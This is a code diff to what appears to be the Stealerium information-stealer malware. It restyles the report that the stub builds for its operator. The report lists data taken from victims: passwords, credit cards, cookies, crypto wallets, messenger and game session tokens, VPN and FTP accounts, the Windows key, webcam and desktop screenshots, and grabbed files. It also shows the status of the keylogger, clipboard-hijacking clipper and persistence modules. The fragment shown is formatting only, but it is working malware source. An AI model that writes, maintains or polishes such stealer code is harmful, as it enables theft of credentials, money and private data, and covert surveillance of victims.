@@ -318,75 +318,83 @@ namespace Stealerium.Stub
 
             // Get system info as a report string
             var info = "```"
-                       + "\n😹 *Stealerium " + Config.Version + " - Report:*"
-                       + "\nDate: " + SystemInfo.Datenow
-                       + "\nSystem: " + SystemInfo.GetSystemVersion()
-                       + "\nUsername: " + SystemInfo.Username
-                       + "\nCompName: " + SystemInfo.Compname
-                       + "\nLanguage: " + Flags.GetFlag(SystemInfo.Culture.Split('-')[1]) + " " + SystemInfo.Culture
-                       + "\nAntivirus: " + SystemInfo.GetAntivirus()
+                       + "\n🔍 *STEALERIUM " + Config.Version + " REPORT*"
+                       + "\n━━━━━━━━━━━━━━━━━━━━━━"
+                       + "\n📅 Date: " + SystemInfo.Datenow
+                       + "\n🖥️ System: " + SystemInfo.GetSystemVersion()
+                       + "\n👤 Username: " + SystemInfo.Username
+                       + "\n💻 CompName: " + SystemInfo.Compname
+                       + "\n🌐 Language: " + Flags.GetFlag(SystemInfo.Culture.Split('-')[1]) + " " + SystemInfo.Culture
+                       + "\n🛡️ Antivirus: " + SystemInfo.GetAntivirus()
                        + "\n"
-                       + "\n💻 *Hardware:*"
-                       + "\nCPU: " + SystemInfo.GetCpuName()
-                       + "\nGPU: " + SystemInfo.GetGpuName()
-                       + "\nRAM: " + SystemInfo.GetRamAmount()
-                       + "\nPower: " + SystemInfo.GetBattery()
-                       + "\nScreen: " + SystemInfo.ScreenMetrics()
-                       + "\nWebcams count: " + WebcamScreenshot.GetConnectedCamerasCount()
+                       + "\n*HARDWARE INFORMATION*"
+                       + "\n━━━━━━━━━━━━━━━━━━━━━━"
+                       + "\n⚡ CPU: " + SystemInfo.GetCpuName()
+                       + "\n🎮 GPU: " + SystemInfo.GetGpuName()
+                       + "\n📊 RAM: " + SystemInfo.GetRamAmount()
+                       + "\n🔋 Power: " + SystemInfo.GetBattery()
+                       + "\n📺 Screen: " + SystemInfo.ScreenMetrics()
+                       + "\n📷 Webcams: " + WebcamScreenshot.GetConnectedCamerasCount()
                        + "\n"
-                       + "\n📡 *Network:* "
-                       + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
-                       + "\nInternal IP: " + SystemInfo.GetLocalIp()
-                       + "\nExternal IP: " + await SystemInfo.GetPublicIpAsync()
+                       + "\n*NETWORK INFORMATION*"
+                       + "\n━━━━━━━━━━━━━━━━━━━━━━"
+                       + "\n🌐 Gateway IP: " + SystemInfo.GetDefaultGateway()
+                       + "\n🔒 Internal IP: " + SystemInfo.GetLocalIp()
+                       + "\n🌍 External IP: " + await SystemInfo.GetPublicIpAsync()
                        + "\n"
-                       + "\n💸 *Domains info:*"
-                       + Counter.GetLValue("🏦 *Banking services*", Counter.DetectedBankingServices, '-')
-                       + Counter.GetLValue("💰 *Cryptocurrency services*", Counter.DetectedCryptoServices, '-')
-                       + Counter.GetLValue("🍓 *Porn websites*", Counter.DetectedPornServices, '-')
+                       + "\n*DETECTED DOMAINS*"
+                       + "\n━━━━━━━━━━━━━━━━━━━━━━"
+                       + Counter.GetLValue("🏦 Banking Services", Counter.DetectedBankingServices, '-')
+                       + Counter.GetLValue("💰 Crypto Services", Counter.DetectedCryptoServices, '-')
+                       + Counter.GetLValue("🔞 Adult Websites", Counter.DetectedPornServices, '-')
                        + GetKeylogsHistory()
                        + "\n"
-                       + "\n🌐 *Browsers:*"
+                       + "\n*BROWSER DATA*"
+                       + "\n━━━━━━━━━━━━━━━━━━━━━━"
                        + Counter.GetIValue("🔑 Passwords", Counter.Passwords)
-                       + Counter.GetIValue("💳 CreditCards", Counter.CreditCards)
+                       + Counter.GetIValue("💳 Credit Cards", Counter.CreditCards)
                        + Counter.GetIValue("🍪 Cookies", Counter.Cookies)
-                       + Counter.GetIValue("📂 AutoFill", Counter.AutoFill)
-                       + Counter.GetIValue("⏳ History", Counter.History)
+                       + Counter.GetIValue("📝 AutoFill", Counter.AutoFill)
+                       + Counter.GetIValue("📜 History", Counter.History)
                        + Counter.GetIValue("🔖 Bookmarks", Counter.Bookmarks)
-                       + Counter.GetIValue("📦 Downloads", Counter.Downloads)
-                       + Counter.GetIValue("💰 Wallet Extensions", Counter.BrowserWallets)
+                       + Counter.GetIValue("📥 Downloads", Counter.Downloads)
+                       + Counter.GetIValue("👛 Wallet Extensions", Counter.BrowserWallets)
                        + "\n"
-                       + "\n🗃 *Software:*"
-                       + Counter.GetIValue("💰 Wallets", Counter.Wallets)
-                       + Counter.GetIValue("📡 FTP hosts", Counter.FtpHosts)
-                       + Counter.GetIValue("🔌 VPN accounts", Counter.Vpn)
-                       + Counter.GetIValue("🦢 Pidgin accounts", Counter.Pidgin)
-                       + Counter.GetSValue("📫 Outlook accounts", Counter.Outlook)
-                       + Counter.GetSValue("✈️ Telegram sessions", Counter.Telegram)
-                       + Counter.GetSValue("☁️ Skype session", Counter.Skype)
-                       + Counter.GetSValue("👾 Discord token", Counter.Discord)
-                       + Counter.GetSValue("💬 Element session", Counter.Element)
-                       + Counter.GetSValue("💭 Signal session", Counter.Signal)
-                       + Counter.GetSValue("🔓 Tox session", Counter.Tox)
-                       + Counter.GetSValue("🧩 Enigma session", Counter.Enigma)
-                       + Counter.GetSValue("🎮 Steam session", Counter.Steam)
-                       + Counter.GetSValue("🎮 Uplay session", Counter.Uplay)
-                       + Counter.GetSValue("🎮 BattleNET session", Counter.BattleNet)
+                       + "\n*SOFTWARE & ACCOUNTS*"
+                       + "\n━━━━━━━━━━━━━━━━━━━━━━"
+                       + Counter.GetIValue("💰 Crypto Wallets", Counter.Wallets)
+                       + Counter.GetIValue("🔌 FTP Hosts", Counter.FtpHosts)
+                       + Counter.GetIValue("🔒 VPN Accounts", Counter.Vpn)
+                       + Counter.GetIValue("💬 Pidgin Accounts", Counter.Pidgin)
+                       + Counter.GetSValue("📧 Outlook", Counter.Outlook)
+                       + Counter.GetSValue("✈️ Telegram", Counter.Telegram)
+                       + Counter.GetSValue("💭 Skype", Counter.Skype)
+                       + Counter.GetSValue("👾 Discord", Counter.Discord)
+                       + Counter.GetSValue("💬 Element", Counter.Element)
+                       + Counter.GetSValue("📱 Signal", Counter.Signal)
+                       + Counter.GetSValue("🔐 Tox", Counter.Tox)
+                       + Counter.GetSValue("🧩 Enigma", Counter.Enigma)
+                       + Counter.GetSValue("🎮 Steam", Counter.Steam)
+                       + Counter.GetSValue("🎮 Uplay", Counter.Uplay)
+                       + Counter.GetSValue("🎮 BattleNET", Counter.BattleNet)
                        + "\n"
-                       + "\n🧭 *Device:*"
-                       + Counter.GetSValue("🗝 Windows product key", Counter.ProductKey)
-                       + Counter.GetIValue("🛰 Wifi networks", Counter.SavedWifiNetworks)
-                       + Counter.GetSValue("📸 Webcam screenshot", Counter.WebcamScreenshot)
-                       + Counter.GetSValue("🌃 Desktop screenshot", Counter.DesktopScreenshot)
+                       + "\n*DEVICE INFORMATION*"
+                       + "\n━━━━━━━━━━━━━━━━━━━━━━"
+                       + Counter.GetSValue("🔑 Windows Key", Counter.ProductKey)
+                       + Counter.GetIValue("📡 WiFi Networks", Counter.SavedWifiNetworks)
+                       + Counter.GetSValue("📸 Webcam Shot", Counter.WebcamScreenshot)
+                       + Counter.GetSValue("🖼️ Desktop Shot", Counter.DesktopScreenshot)
                        + "\n"
-                       + "\n🦠 *Installation:*"
+                       + "\n*INSTALLATION STATUS*"
+                       + "\n━━━━━━━━━━━━━━━━━━━━━━"
                        + Counter.GetBValue(Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices),
-                        "✅ Startup installed", "⛔️ Startup disabled")
+                        "✅ Startup: Installed", "⛔ Startup: Disabled")
                        + Counter.GetBValue(Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1",
-                        "✅ Clipper installed", "⛔️ Clipper not installed")
+                        "✅ Clipper: Active", "⛔ Clipper: Inactive")
                        + Counter.GetBValue(Config.KeyloggerModule == "1" && (Counter.BankingServices || Counter.Telegram) && Config.Autorun == "1",
-                        "✅ Keylogger installed", "⛔️ Keylogger not installed")
+                        "✅ Keylogger: Running", "⛔ Keylogger: Stopped")
                        + "\n"
-                       + "\n📄 *File Grabber:*" + (Config.GrabberModule != "1" ? "\n   ∟ ⛔️ Disabled in configuration" : "")
+                       + "\n*FILE GRABBER*" + (Config.GrabberModule != "1" ? "\n⛔ Disabled in configuration" : "")
                        + Counter.GetIValue("📂 Images", Counter.GrabberImages)
                        + Counter.GetIValue("📂 Documents", Counter.GrabberDocuments)
                        + Counter.GetIValue("📂 Database files", Counter.GrabberDatabases)
